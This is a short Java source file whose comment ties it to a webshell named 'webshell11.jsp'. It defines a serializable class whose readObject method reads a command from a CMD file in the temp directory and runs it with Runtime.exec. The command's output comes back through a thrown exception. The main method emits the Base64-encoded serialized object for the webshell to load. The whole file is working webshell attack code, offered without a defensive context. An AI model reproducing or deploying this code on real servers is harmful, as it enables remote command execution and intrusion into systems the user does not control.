import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * 该类用于 webshell11.jsp
 */
public class Demo4 implements Serializable {
    private static final long serialVersionUID = 1L;

    private void  readObject(ObjectInputStream is) throws Throwable {
        StringBuilder sb = new StringBuilder();
        try {
            String tmp = System.getProperty("java.io.tmpdir");
            String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String line;
            while((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        throw new Throwable(sb.toString());
    }

    public static void main(String[] args) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(new Demo4());
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
